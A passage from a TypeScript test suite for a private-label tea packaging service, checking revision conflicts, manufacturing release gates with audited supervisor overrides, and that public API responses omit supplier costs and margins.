      const statuses = [res1.status, res2.status].sort();
      // Exactly one succeeds (200), one fails with conflict (409)
      expect(statuses).toEqual([200, 409]);

      // Check revision incremented by exactly 1
      const updated = db
        .prepare("SELECT revision FROM pl_projects WHERE id = ?")
        .get(tenantAProjectId) as { revision: number };
      expect(updated.revision).toBe(currentRev + 1);
    });

    it("3.3 MCP private_label_save_project throws -32009 on stale revision", () => {
      const err = failsMcpWith("private_label_save_project", {
        id: tenantAProjectId,
        client_id: TENANT_A_CLIENT,
        expected_revision: 0, // Stale!
        title: "MCP Stale Attempt",
      });

      expect(err.code).toBe(-32009);
      expect(err.message).toMatch(/revision conflict/i);
    });

    it("3.4 MCP private_label_upsert_packaging throws -32009 on stale packaging variant revision", () => {
      const packs = PrivateLabelService.listPackaging();
      const variant = packs.items[0];
      expect(variant).toBeDefined();

      const err = failsMcpWith("private_label_upsert_packaging", {
        id: variant.id,
        family_id: variant.family_id,
        name: "Conflict Packaging Update",
        capacity_description: "100g",
        net_weight_capacity_grams: 100,
        material: "Kraft Paper",
        expected_revision: 9999, // Stale!
      });

      expect(err.code).toBe(-32009);
      expect(err.message).toMatch(/revision conflict/i);
    });

    it("3.5 Re-approving an already locked proof revision returns 409 Conflict", async () => {
      prepareProofForApproval(tenantADesignVersionId);
      // First, legally approve the proof revision
      const resApprove = await approveProofRoute(
        new Request(`http://localhost/api/v1/private-label/proofs/${tenantADesignVersionId}/approve`, {
          method: "POST",
          headers: { "Content-Type": "application/json", "x-customer-id": TENANT_A_CUST },
          body: JSON.stringify({
            disclaimer_accepted: true,
            signer_name: "Alice Alpha",
          }),
        }),
        { params: Promise.resolve({ id: tenantADesignVersionId }) }
      );
      expect(resApprove.status).toBe(200);

      // Attempt second approval on same locked proof
      const resSecond = await approveProofRoute(
        new Request(`http://localhost/api/v1/private-label/proofs/${tenantADesignVersionId}/approve`, {
          method: "POST",
          headers: { "Content-Type": "application/json", "x-customer-id": TENANT_A_CUST },
          body: JSON.stringify({
            disclaimer_accepted: true,
            signer_name: "Alice Alpha",
          }),
        }),
        { params: Promise.resolve({ id: tenantADesignVersionId }) }
      );

      expect(resSecond.status).toBe(409);
      const json = await resSecond.json();
      expect(json.error).toMatch(/already approved/i);
    });
  });

  // ==========================================================================
  // SUITE 4: Manufacturing Release Gate Bypass Stress-Testing
  // ==========================================================================
  describe("Suite 4: Manufacturing Release Gate Bypass Stress-Testing", () => {
    let unapprovedOrderId: string;

    beforeAll(() => {
      // Create a new separate project and order that has NOT paid deposit and has NO approved proof
      const proj = PrivateLabelService.createProjectDraft(
        { title: "Gated Project 100", target_market: "IN" },
        TENANT_A_CUST,
        ACTOR_TENANT_A
      );
      const teas = PrivateLabelService.listTeaOptions();
      const packs = PrivateLabelService.listPackaging();
      const prints = PrivateLabelService.listPrintMethods();
      const piId = `pi_gate_${Date.now()}`;
      db.prepare(`
        INSERT INTO pl_project_items (id, project_id, tea_option_id, packaging_variant_id, print_method_id, fill_weight_grams, quantity_units, color_count)
        VALUES (?, ?, ?, ?, ?, 100, 1000, 1)
      `).run(piId, proj.id, teas.items[0].id, packs.items[0].id, prints[0].id);

      const q = PrivateLabelService.createQuote(proj.id, { validity_days: 30 }, ACTOR_TENANT_A, TENANT_A_CUST);
      const { order } = PrivateLabelService.convertQuoteToOrder(
        q.id,
        {
          shipping_address: { city: "Siliguri", line1: "Test St", country: "India" },
        },
        TENANT_A_CUST,
        ACTOR_TENANT_A
      );
      unapprovedOrderId = order.id;
    });

    it("4.1 REST Admin release endpoint blocks order with unapproved proof and unpaid deposit (422)", async () => {
      const res = await releaseJobAdminRoute(
        new Request("http://localhost/api/v1/admin/private-label/jobs", {
          method: "POST",
          headers: ADMIN_HEADERS,
          body: JSON.stringify({
            order_id: unapprovedOrderId,
            operator_notes: "Attempted early bypass without proof or deposit",
          }),
        })
      );

      expect(res.status).toBe(422);
      const data = await res.json();
      expect(data.gate_name).toBe("production_release");
      expect(data.blockers.length).toBeGreaterThanOrEqual(2);
      expect(data.blockers.some((b: string) => /deposit/i.test(b))).toBe(true);
      expect(data.blockers.some((b: string) => /proof/i.test(b))).toBe(true);
    });

    it("4.2 REST Admin release endpoint blocks order with paid deposit but unapproved proof (422)", async () => {
      // Mark deposit paid manually in DB
      db.prepare("UPDATE pl_orders SET status = 'deposit_paid' WHERE id = ?").run(unapprovedOrderId);

      const res = await releaseJobAdminRoute(
        new Request("http://localhost/api/v1/admin/private-label/jobs", {
          method: "POST",
          headers: ADMIN_HEADERS,
          body: JSON.stringify({
            order_id: unapprovedOrderId,
          }),
        })
      );

      expect(res.status).toBe(422);
      const data = await res.json();
      expect(data.gate_name).toBe("production_release");
      expect(data.blockers.some((b: string) => /proof/i.test(b))).toBe(true);
    });

    it("4.3 MCP private_label_release_job throws -32009 and writes durable release_blocked audit trail", () => {
      // Call MCP tool without override justification
      const err = failsMcpWith("private_label_release_job", {
        order_id: unapprovedOrderId,
      });

      expect(err.code).toBe(-32009);
      expect(err.message).toMatch(/proof approval is required/i);

      // Verify that release_blocked was recorded in pl_audit
      const audit = db
        .prepare(
          "SELECT * FROM pl_audit WHERE entity_type = 'production_job' AND entity_id = ? AND action = 'release_blocked' ORDER BY id DESC LIMIT 1"
        )
        .get(unapprovedOrderId) as { action: string; diff_json: string } | undefined;

      expect(audit).toBeDefined();
      expect(audit?.action).toBe("release_blocked");
      expect(audit?.diff_json).toMatch(/proof approval is required/i);
    });

    it("4.4 Release succeeds when supervisor provides explicit override_justification", async () => {
      const overrideReason = "Emergency VIP batch authorized by Manufacturing Director";
      const res = await releaseJobAdminRoute(
        new Request("http://localhost/api/v1/admin/private-label/jobs", {
          method: "POST",
          headers: ADMIN_HEADERS,
          body: JSON.stringify({
            order_id: unapprovedOrderId,
            override_justification: overrideReason,
            operator_notes: "Override bypass test",
          }),
        })
      );

      expect([200, 201]).toContain(res.status);
      const data = await res.json();
      const job = data.job || data;
      expect(job).toHaveProperty("id");
      expect(job.status).toBe("scheduled");

      // Verify 7 standard QC milestones were initialized
      const qcMilestones = db
        .prepare("SELECT * FROM pl_qc_milestones WHERE job_id = ?")
        .all(job.id);
      expect(qcMilestones.length).toBe(7);

      // Verify override justification recorded in pl_jobs
      const dbJob = db.prepare("SELECT override_justification FROM pl_jobs WHERE id = ?").get(job.id) as {
        override_justification: string;
      };
      expect(dbJob.override_justification).toBe(overrideReason);
    });
  });

  // ==========================================================================
  // SUITE 5: Whitelist Public Projection & Sensitive Data Leakage Audit
  // ==========================================================================
  describe("Suite 5: Whitelist Public Projection & Sensitive Data Leakage Audit", () => {
    it("5.1 GET /catalogue strictly omits internal supplier costs, COGS, and private margins", async () => {
      const res = await getCatalogueRoute(
        new Request("http://localhost/api/v1/private-label/catalogue")
      );
      expect(res.status).toBe(200);
      const data = await res.json();
      const variants = ((data.items || data.packaging || []) as Array<Record<string, unknown>>);
      expect(variants.length).toBeGreaterThan(0);

      for (const variant of variants) {
        expect(variant).not.toHaveProperty("unit_cost_paise");
        expect(variant).not.toHaveProperty("supplier_cost_paise");
        expect(variant).not.toHaveProperty("supplier_name");
        expect(variant).not.toHaveProperty("supplier_sku");
        expect(variant).not.toHaveProperty("cogs_paise");
        expect(variant).not.toHaveProperty("margin_rate");
        expect(variant).not.toHaveProperty("margin_pct");
        expect(variant).not.toHaveProperty("internal_cogs");
      }
    });

    it("5.2 GET /packaging/[slug] strictly omits confidential supplier and cost fields", async () => {
      const packs = PrivateLabelService.listPackaging();
      const slug = packs.items[0].slug;

      const res = await getPackagingDetailRoute(
        new Request(`http://localhost/api/v1/private-label/packaging/${slug}`),
        { params: Promise.resolve({ slug }) }
      );
      expect(res.status).toBe(200);
      const data = await res.json();

      expect(data).not.toHaveProperty("unit_cost_paise");
      expect(data).not.toHaveProperty("supplier_cost_paise");
      expect(data).not.toHaveProperty("supplier_name");
      expect(data).not.toHaveProperty("supplier_sku");
      expect(data).not.toHaveProperty("cogs_paise");
    });

    it("5.3 GET /projects/[id] strictly omits client_id and internal notes from public project DTO", async () => {
      const res = await getProjectRoute(
        new Request(`http://localhost/api/v1/private-label/projects/${tenantAProjectId}`, {
          method: "GET",
          headers: { "x-customer-id": TENANT_A_CUST },
        }),
        { params: Promise.resolve({ id: tenantAProjectId }) }
      );
      expect(res.status).toBe(200);
      const data = await res.json();
      const proj = data.project;

      expect(proj).not.toHaveProperty("client_id");
      expect(proj).not.toHaveProperty("owner_customer_id");
      expect(proj).not.toHaveProperty("internal_notes");
    });

    it("5.4 GET /quotes/[id] strictly omits margin_paise and confidential COGS from public quote DTO", async () => {
      const res = await getQuoteRoute(
        new Request(`http://localhost/api/v1/private-label/quotes/${tenantAQuoteId}`, {
          method: "GET",
          headers: { "x-customer-id": TENANT_A_CUST },
        }),
        { params: Promise.resolve({ id: tenantAQuoteId }) }
      );
      expect(res.status).toBe(200);
      const data = await res.json();
      const quote = data.quote;

      expect(quote).not.toHaveProperty("margin_paise");
      expect(quote).not.toHaveProperty("price_book_id");
      expect(quote).not.toHaveProperty("cost_breakdown_json");
    });

    it("5.5 GET /orders/[id] strictly omits cogs_breakdown and released_by operator IDs", async () => {
      const res = await getOrderRoute(
        new Request(`http://localhost/api/v1/private-label/orders/${tenantAOrderId}`, {
          method: "GET",
          headers: { "x-customer-id": TENANT_A_CUST },
        }),
        { params: Promise.resolve({ id: tenantAOrderId }) }
      );
      expect(res.status).toBe(200);
      const order = await res.json();

      expect(order).not.toHaveProperty("client_id");
      expect(order).not.toHaveProperty("supplier_vendor_id");
      expect(order).not.toHaveProperty("cogs_breakdown");
      expect(order).not.toHaveProperty("margin_paise");
      if (order.job) {
        expect(order.job).not.toHaveProperty("released_by");
      }
    });

    it("5.6 MCP private_label_list_catalogue strictly respects public whitelist projection", () => {
      const cat = callMcp<{ packaging: Array<Record<string, unknown>> }>(
        "private_label_list_catalogue"
      );
      expect(cat.packaging.length).toBeGreaterThan(0);
      for (const pv of cat.packaging) {
        expect(pv).not.toHaveProperty("supplier_cost_paise");
        expect(pv).not.toHaveProperty("supplier_name");
        expect(pv).not.toHaveProperty("cogs_paise");
      }
    });
  });
});
